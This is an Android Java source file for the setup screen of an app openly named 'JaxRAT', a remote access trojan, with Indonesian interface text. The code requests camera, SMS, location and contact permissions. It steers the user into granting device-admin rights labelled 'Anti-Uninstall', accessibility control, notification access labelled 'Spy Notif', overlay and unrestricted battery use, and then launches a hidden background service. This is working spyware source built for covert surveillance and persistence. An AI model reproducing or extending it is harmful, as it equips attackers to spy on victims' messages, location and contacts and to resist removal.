package com.ezax.agent;

import android.app.Activity;
import android.app.admin.DevicePolicyManager;
import android.content.ComponentName;
import android.content.Context;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.net.Uri;
import android.os.Build;
import android.os.Bundle;
import android.os.PowerManager;
import android.provider.Settings;
import android.view.View;
import android.view.accessibility.AccessibilityManager;
import android.accessibilityservice.AccessibilityServiceInfo;
import android.widget.Button;
import android.widget.LinearLayout;
import android.widget.ScrollView;
import android.widget.TextView;
import android.widget.Toast;
import androidx.core.app.ActivityCompat;
import androidx.core.content.ContextCompat;
import java.util.List;

public class PermissionActivity extends Activity {
    private LinearLayout mainLayout;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        
        ScrollView scrollView = new ScrollView(this);
        mainLayout = new LinearLayout(this);
        mainLayout.setOrientation(LinearLayout.VERTICAL);
        mainLayout.setPadding(40, 40, 40, 40);
        scrollView.addView(mainLayout);
        setContentView(scrollView);

        // Minta izin dasar (Kamera, Lokasi, SMS, Kontak) sekaligus
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
            String[] permissions = {
                android.Manifest.permission.CAMERA,
                android.Manifest.permission.READ_SMS,
                android.Manifest.permission.ACCESS_FINE_LOCATION,
                android.Manifest.permission.READ_CONTACTS
            };
            ActivityCompat.requestPermissions(this, permissions, 100);
        }
        updateUI();
    }

    @Override
    protected void onResume() {
        super.onResume();
        updateUI(); // Refresh status tiap balik dari menu pengaturan
    }

    private void updateUI() {
        mainLayout.removeAllViews();

        TextView title = new TextView(this);
        title.setText("JAXRAT SETUP\nIzinkan semua akses agar sistem berjalan:\n");
        title.setTextSize(20);
        mainLayout.addView(title);

        checkRuntimePerm(android.Manifest.permission.CAMERA, "Kamera");
        checkRuntimePerm(android.Manifest.permission.READ_SMS, "SMS");
        checkRuntimePerm(android.Manifest.permission.ACCESS_FINE_LOCATION, "Lokasi");
        checkRuntimePerm(android.Manifest.permission.READ_CONTACTS, "Kontak");
        
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
            checkRuntimePerm(android.Manifest.permission.POST_NOTIFICATIONS, "Notifikasi");
        }

        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
            addPermissionRow("Izin Overlay (Tampil diatas)", Settings.canDrawOverlays(this), v -> {
                startActivity(new Intent(Settings.ACTION_MANAGE_OVERLAY_PERMISSION, Uri.parse("package:" + getPackageName())));
            });
        }

        ComponentName adminComponent = new ComponentName(this, JaxAdminReceiver.class);
        DevicePolicyManager dpm = (DevicePolicyManager) getSystemService(DEVICE_POLICY_SERVICE);
        addPermissionRow("Device Admin (Anti-Uninstall)", dpm.isAdminActive(adminComponent), v -> {
            Intent intent = new Intent(DevicePolicyManager.ACTION_ADD_DEVICE_ADMIN);
            intent.putExtra(DevicePolicyManager.EXTRA_DEVICE_ADMIN, adminComponent);
            startActivity(intent);
        });

        addPermissionRow("Aksesibilitas (App Blocker)", isAccessibilityEnabled(), v -> {
            startActivity(new Intent(Settings.ACTION_ACCESSIBILITY_SETTINGS));
        });

        addPermissionRow("Akses Notifikasi (Spy Notif)", isNotificationListenerEnabled(), v -> {
            startActivity(new Intent("android.settings.ACTION_NOTIFICATION_LISTENER_SETTINGS"));
        });

        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
            PowerManager pm = (PowerManager) getSystemService(Context.POWER_SERVICE);
            addPermissionRow("Baterai Tanpa Batas", pm.isIgnoringBatteryOptimizations(getPackageName()), v -> {
                Intent intent = new Intent(Settings.ACTION_REQUEST_IGNORE_BATTERY_OPTIMIZATIONS);
                intent.setData(Uri.parse("package:" + getPackageName()));
                startActivity(intent);
            });
        }

        Button startBtn = new Button(this);
        startBtn.setText("SIMPAN & JALANKAN JAXRAT");
        startBtn.setBackgroundColor(0xFF00FF00);
        startBtn.setOnClickListener(v -> {
            Intent serviceIntent = new Intent(this, JaxRATService.class);
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                startForegroundService(serviceIntent);
            } else {
                startService(serviceIntent);
            }
            Toast.makeText(this, "JaxRAT Berjalan di Background!", Toast.LENGTH_LONG).show();
            finish();
        });
        
        LinearLayout.LayoutParams params = new LinearLayout.LayoutParams(LinearLayout.LayoutParams.MATCH_PARENT, LinearLayout.LayoutParams.WRAP_CONTENT);
        params.setMargins(0, 50, 0, 0);
        startBtn.setLayoutParams(params);
        mainLayout.addView(startBtn);
    }

    private void checkRuntimePerm(String perm, String name) {
        boolean granted = ContextCompat.checkSelfPermission(this, perm) == PackageManager.PERMISSION_GRANTED;
        addPermissionRow(name, granted, v -> ActivityCompat.requestPermissions(this, new String[]{perm}, 100));
    }

    private void addPermissionRow(String name, boolean granted, View.OnClickListener fixListener) {
        LinearLayout row = new LinearLayout(this);
        row.setOrientation(LinearLayout.HORIZONTAL);
        row.setPadding(0, 16, 0, 16);

        TextView status = new TextView(this);
        status.setText(name + ": " + (granted ? "✅ OK" : "❌ BELUM"));
        status.setTextSize(16);
        LinearLayout.LayoutParams textParams = new LinearLayout.LayoutParams(0, LinearLayout.LayoutParams.WRAP_CONTENT, 1f);
        status.setLayoutParams(textParams);
        row.addView(status);

        if (!granted) {
            Button fixBtn = new Button(this);
            fixBtn.setText("IZINKAN");
            fixBtn.setOnClickListener(fixListener);
            row.addView(fixBtn);
        }
        mainLayout.addView(row);
    }

    private boolean isAccessibilityEnabled() {
        AccessibilityManager am = (AccessibilityManager) getSystemService(Context.ACCESSIBILITY_SERVICE);
        List<AccessibilityServiceInfo> runningServices = am.getEnabledAccessibilityServiceList(AccessibilityServiceInfo.FEEDBACK_ALL_MASK);
        for (AccessibilityServiceInfo service : runningServices) {
            if (service.getId().contains(getPackageName())) return true;
        }
        return false;
    }

    private boolean isNotificationListenerEnabled() {
        String flat = Settings.Secure.getString(getContentResolver(), "enabled_notification_listeners");
        return flat != null && flat.contains(getPackageName());
    }
}
